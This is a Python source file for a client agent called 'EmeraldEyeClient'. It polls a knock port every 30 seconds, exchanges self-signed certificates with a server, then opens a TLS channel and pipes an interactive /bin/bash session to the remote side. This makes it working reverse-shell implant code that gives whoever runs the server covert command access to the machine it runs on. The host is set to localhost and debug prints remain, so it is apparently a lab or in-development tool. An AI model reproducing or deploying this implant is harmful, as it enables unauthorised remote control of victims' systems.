import subprocess
import socket
import pty
import time
import threading
from OpenSSL import crypto
import ssl
import os 
import select 

KNOCK_PORT = 31415
TLS_PORT = 31416
#HOST = ""
HOST = "127.0.0.1"
class EmeraldEyeClient():

    def __init__(self, host):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.tls_private_key_file = "client.key"
        self.tls_cert_file = "client.crt"
        self.tls_other_crt_file = "server.crt"
        self.server_hostname='emeraldeye.io'
        self.crt = self.cert_gen()

    def cert_gen(self, validityEndInSeconds=10*365*24*60*60):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        ret = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
        with open(self.tls_cert_file, "wt") as f:
            f.write(ret.decode("utf-8"))
        with open(self.tls_private_key_file, "wt") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
        return ret

    def interact(self):
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_other_crt_file)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
        ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
        ss.connect((self.host, TLS_PORT))
        stdin_control, stdin = pty.openpty()
        stdout_control, stdout = pty.openpty()
        stderr_control, stderr = pty.openpty()
        bash = subprocess.Popen("/bin/bash",
                                preexec_fn=os.setsid,
                                stdin=stdin,
                                stdout=stdout,
                                stderr=stderr,
                                universal_newlines=True)
        time.sleep(0.5)  
        while bash.poll() is None:
            buffer, _, _ = select.select([ss, stdin_control, stdout_control, stderr_control], [], [])
            # Need to clean this up, but having issues with io mashing together and sending in one packet
            if stdin_control in buffer:
                print("A")
                io_read = os.read(stdin_control, 2048)
                if io_read:
                    io_read += b'-emrdeye'
                    print("Data Sent: " + io_read.decode())
                    ss.write(io_read)
            elif stdout_control in buffer:
                print("B")
                io_read = os.read(stdout_control, 2048)
                if io_read:
                    io_read += b'-emrdeye'
                    print("Data Sent: " + io_read.decode())
                    ss.write(io_read)
            elif stderr_control in buffer:
                print("C")
                io_read = os.read(stderr_control, 2048)
                if io_read:
                    io_read += b'-emrdeye'
                    print("Data Sent: " + io_read.decode())
                    ss.write(io_read)
            elif ss in buffer:
                print("D")
                try:
                    packet = ss.recv(1024)
                    print("packet Received: " + packet.decode())
                except ssl.SSLError as e:
                    if e.errno == ssl.SSL_ERROR_WANT_READ:
                        continue
                    raise
                if not packet:
                    break
                packet_left = ss.pending()
                while packet_left:
                    packet += ss.recv(packet_left)
                    packet_left = ss.pending()
                os.write(stdin_control, packet)
                
    def health_check(self):
        print("Trying to connect...")
        try:
            self.knock_sock.connect((self.host, KNOCK_PORT))
            print("Connected to :" + self.host)
            self.knock_sock.sendall(b'Knock')
            packet = self.knock_sock.recv(1024)
            if packet == b'Knock':
                print("packet Received: " + packet.decode())
                pass
            elif b'crt-' in packet:
                print("packet Received: " + packet.decode())
                other_crt = packet.split(b'crt-')[1]
                time.sleep(0.25) 
                crt = b'crt-'+self.crt
                print("Sending cert to server...")
                self.knock_sock.sendall(crt)
                resv = b''
                while resv == b'':
                    try:
                        self.knock_sock.settimeout(5)
                        resv = self.knock_sock.recv(1024)
                    except Exception as e:
                        print("Didn't get go signal, retrying")
                with open(self.tls_other_crt_file, "wt") as f:
                    f.write(other_crt.decode("utf-8"))
                threading.Thread(target=self.interact(), args=()).start()              
            else:
                print("Agent Recieved unxpected data " + str(packet))
        except Exception as e:
            print("Can't reach server will retry in 30 seconds")

def main():
    k = EmeraldEyeClient(HOST)
    while True:
        k.health_check()
        time.sleep(30)
main()